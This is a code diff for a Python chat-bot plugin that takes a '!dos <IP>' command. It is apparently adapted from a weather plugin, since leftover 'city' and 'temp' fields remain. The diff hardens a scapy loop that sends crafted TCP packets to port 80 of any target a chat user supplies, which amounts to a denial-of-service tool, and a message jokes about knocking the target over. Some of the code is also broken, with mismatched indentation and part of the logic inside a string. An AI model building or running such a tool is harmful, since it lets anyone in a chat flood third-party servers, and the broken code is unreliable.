@@ -9,30 +9,30 @@ def dos(components): # !dos <city> or !dos <city>, <state or country>
     response = ''
     result = ''
 
-    #try:
-    print components
-    target = components['arguments'].split('!dos ')[1]
-    print "Target:", target
-    target = target.lstrip()
+    try:
+        print components
+        target = components['arguments'].split('!dos ')[1]
+        print "Target:", target
+        target = target.lstrip()
 
-    if len(target) < 1:
-        raise Exception('Empty IP!')
-   
-    else:
-        target = target.replace(' ', '')
-        result = do_dos(target)
-        if type(result) == type(str()):
-            response = result
+        if len(target) < 1:
+            raise Exception('Empty IP!')
+       
         else:
-            response = result['target'] + ' - ' + result['temp'] + \
-                    ' - ' + result['dos'] + ' - Provided by: ' + \
-                    'dos Underground, Inc.'
+            target = target.replace(' ', '')
+            result = do_dos(target)
+            if type(result) == type(str()):
+                response = result
+            else:
+                response = result['target'] + ' - ' + result['temp'] + \
+                        ' - ' + result['dos'] + ' - Provided by: ' + \
+                        'dos Underground, Inc.'
 
-    return response.encode('utf8')
-    #except:
-    #    response = 'Usage: !dos IP'
-    #    print "Exception"
-    #    return "Exception"
+        return response.encode('utf8')
+    except:
+       response = 'Usage: !dos IP'
+        print "Exception - If a broken pipe caused this then you probably knocked it over!"
+        return "Exception"
 
 '''
 from scapy.all import *
@@ -71,11 +71,15 @@ def do_dos(target):
             TCP1 = TCP(sport=srcport, dport=80)
             pkt = IP1 / TCP1
             #send(pkt,inter= .0001)
-            send(pkt)
+            try:
+                send(pkt)
+            except:
+                print "Exception: Send Packet"
+                continue
             #sys.stdout.write( '.' )
             #sys.stdout.flush()
             #print "packet sent ", i
-            loop_break = loop_break+1
+            loop_break += 1
             i=i+1
             if loop_break ==50 :
                 break
